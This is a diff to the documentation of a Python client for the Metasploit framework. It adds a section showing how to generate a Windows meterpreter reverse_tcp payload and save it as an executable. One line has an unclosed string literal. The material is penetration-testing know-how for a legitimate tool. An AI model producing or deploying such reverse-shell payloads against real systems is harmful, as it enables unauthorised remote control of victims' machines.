@@ -149,6 +149,38 @@ We know the job ran successfully because `job_id` is `1`. If the module failed t
 >>>
 ```
 
+### generate a payload
+
+Create a payload module object:
+
+```python
+payload = client.modules.use('payload', 'windows/meterpreter/reverse_tcp')
+```
+
+View module information as described above
+
+Setting runoptions and generate payload
+
+```python
+# set runoptions
+payload.runoptions['BadChars'] = ''
+payload.runoptions['Encoder'] = ''
+payload.runoptions['Format'] = 'exe
+payload.runoptions['NopSledSize'] = 0
+payload.runoptions['ForceEncode'] = False
+# payload.runoptions['Template'] = ''
+payload.runoptions['Platform'] = ''
+# payload.runoptions['KeepTemplateWorking'] = True
+payload.runoptions['Iterations'] = 0
+
+data = payload.payload_generate()
+if isinstance(data, str):
+    print(data)
+else:
+    with open('test.exe', 'wb') as f:
+        f.write(data)
+```
+
 ### Interacting with the shell
 Create a shell object out of the session number we found above and write to it:
 
